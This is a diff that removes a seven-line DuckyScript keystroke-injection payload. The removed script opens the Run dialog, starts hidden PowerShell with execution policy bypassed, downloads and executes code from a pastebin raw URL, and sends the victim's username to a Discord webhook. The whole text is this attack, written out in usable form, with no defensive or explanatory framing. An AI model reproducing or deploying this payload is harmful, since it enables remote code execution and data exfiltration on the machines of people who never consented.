@@ -1,7 +1,0 @@
-REM ---- Gets the username of the computer and sends it to a discord webhook ---- 
-
-DELAY 1000 
-GUI r 
-DELAY 300
-STRING powershell -w h -NoP -Ep Bypass iex (iwr "https://pastebin.com/raw/p3tzh6z9" -UseBasicParsing).Content; SendStringToDiscord (whoami) "DISCORD_WEBHOOK_URL"
-ENTER
